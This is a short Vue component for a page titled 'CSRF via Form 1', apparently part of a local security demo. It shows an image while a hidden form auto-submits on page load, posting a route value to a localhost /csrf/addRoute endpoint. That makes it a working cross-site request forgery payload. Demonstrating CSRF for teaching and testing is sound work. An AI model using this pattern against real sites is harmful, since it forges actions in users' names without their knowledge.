<template>
  <div>
    <v-row>
      <v-col>
        <div class="d-flex justify-space-between align-center mb-6">
          <h1 class="text-h3">CSRF via Form 1</h1>
        </div>

        <img src="/snail-151802_1280.png" height="200">
        <form id="form" action="http://localhost:8080/csrf/addRoute" method="post" style="display: none">
          <input type="text" name="route" value="oops-i-did-it-again">
        </form>
      </v-col>
    </v-row>
  </div>
</template>

<script setup lang="ts">
  import { ref, onMounted } from 'vue'


  onMounted(() => {
    const el = document.getElementById("form")
    el.submit()
  })
</script>